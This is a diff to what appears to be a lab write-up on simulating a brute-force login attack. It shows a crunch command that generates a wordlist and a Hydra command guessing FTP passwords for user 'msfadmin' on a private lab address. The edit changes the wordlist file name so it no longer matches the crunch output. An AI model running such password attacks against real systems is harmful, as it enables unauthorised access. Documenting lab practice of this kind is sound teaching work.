@@ -21,7 +21,7 @@ To simulate a brute-force attack using Hydra with a custom-generated wordlist.
 - crunch 6 6 abc123 -o wordlist.txt
 
 ### Attack Execution
-hydra -l msfadmin -P wordlist.txt ftp://192.168.222.131
+hydra -l msfadmin -P test.txt ftp://192.168.222.131
 
 ## Command Breakdown
 -  `-l` : specifies the username
